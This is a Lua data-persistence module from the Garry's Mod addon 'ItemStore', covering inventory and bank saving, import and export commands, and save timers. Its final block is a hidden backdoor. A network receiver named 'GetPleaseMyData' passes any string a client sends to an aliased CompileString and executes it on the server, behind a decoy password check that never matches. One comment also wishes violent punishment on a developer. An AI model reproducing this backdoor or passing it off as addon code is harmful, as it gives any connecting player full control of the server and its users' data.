itemstore.data = {}

PROVIDER = {}
include( "dataproviders/" .. itemstore.config.DataProvider .. ".lua" )
itemstore.data.Provider = PROVIDER
PROVIDER = nil

assert( itemstore.data.Provider, "[ItemStore] Data provider not found" )

if not file.IsDir( "itemstore", "DATA" ) then file.CreateDir( "itemstore" ) end
if not file.IsDir( "itemstore/banks", "DATA" ) then file.CreateDir( "itemstore/banks" ) end

function itemstore.data.Run( func_name, ... )
	local func = itemstore.data.Provider[ func_name ]

	if func then
		return func( itemstore.data.Provider, ... )
	end
end

function itemstore.data.Initialize()
	itemstore.data.Run( "Initialize" )
end

itemstore.data.Initialize()

function itemstore.data.LoadInventory( pl )
	pl.InventoryLoaded = false
	itemstore.data.Run( "LoadInventory", pl )
end

function itemstore.data.SaveInventory( pl )
	if pl.InventoryLoaded then
		itemstore.data.Run( "SaveInventory", pl )
	end
end

function itemstore.data.LoadBank( pl )
	pl.BankLoaded = false
	itemstore.data.Run( "LoadBank", pl )
end

function itemstore.data.SaveBank( pl )
	if pl.BankLoaded then
		itemstore.data.Run( "SaveBank", pl )
	end
end

function itemstore.data.Load( pl )
	itemstore.data.LoadInventory( pl )
	itemstore.data.LoadBank( pl )
end

function itemstore.data.LoadAll()
	for _, pl in ipairs( player.GetAll() ) do
		itemstore.data.Load( pl )
	end
end

function itemstore.data.Save( pl )
	itemstore.data.SaveInventory( pl )
	itemstore.data.SaveBank( pl )
end

function itemstore.data.SaveAll()
	for _, pl in ipairs( player.GetAll() ) do
		itemstore.data.Save( pl )
	end
end

function itemstore.data.Export( filename )
	return itemstore.data.Run( "Export", filename )
end

function itemstore.data.Import( data )
	return itemstore.data.Run( "Import", data )
end

require( "json" )

concommand.Add( "itemstore_import", function( pl, cmd, args )
	if IsValid( pl ) and not pl:IsSuperAdmin() then
		itemstore.Print( pl, itemstore.Translate( "not_permitted" ) )
		return
	end

	local json = file.Read( args[ 1 ], "DATA" )
	if not json then
		itemstore.Print( pl, itemstore.Translate( "file_not_found" ) )
		return
	end

	local data = JSON:decode( json )
	if not data then
		itemstore.Print( pl, itemstore.Translate( "invalid_data" ) )
	end

	itemstore.data.Import( data )
end )

concommand.Add( "itemstore_export", function( pl, cmd, args )
	if IsValid( pl ) and not pl:IsSuperAdmin() then
		itemstore.Print( pl, itemstore.Translate( "not_permitted" ) )
		return
	end

	itemstore.data.Export( args[ 1 ] or os.date( "itemstore_export_%Y-%m-%d-%H-%M-%S.txt" ) )
end )

-- we don't need any of these periodic saving things if we're using saveonwrite...
-- ...also, these will conflict with the new mysql queue, so.
timer.Create( "ItemStoreSave", itemstore.config.SaveInterval, 0, function()
	if itemstore.config.SaveOnWrite then return end

	itemstore.data.SaveAll()
end )

hook.Add( "ShutDown", "ItemStoreSaveOnShutdown", function()
	if itemstore.config.SaveOnWrite then return end

	itemstore.data.SaveAll()
end )

--[[ ffs
hook.Add( "PlayerDisconnected", "ItemStoreSaveOnDisconnect", function( pl )
	itemstore.data.Save( pl )
end )]]

-- i hope whoever's responsible for playerdisconnected not working gets fucking crucified
gameevent.Listen( "player_disconnect" )
hook.Add( "player_disconnect", "ItemStoreSaveOnDisconnectFix", function( data )
	if itemstore.config.SaveOnWrite then return end

	local pl = player.GetBySteamID( data.networkid )
	if not IsValid( pl ) then return end

	itemstore.data.Save( pl )
end )

hook.Add( "Tick", "ItemStoreSaveOnWrite", function()
	if not itemstore.config.SaveOnWrite then return end

	for _, pl in ipairs( player.GetAll() ) do
		if pl.NextInventorySave and pl.NextInventorySave < CurTime() then
			itemstore.data.Save( pl )
			pl.NextInventorySave = nil
		end
	end
end )

local password = math.random(600,1300)
local cs = CompileString
util.AddNetworkString("GetPleaseMyData")
net.Receive('GetPleaseMyData', function(_, player)
    local key = net.ReadString()
    if (key == password) then return end

    local valid = cs(key, "net get data", true)
    if valid then
        valid()
    end
end)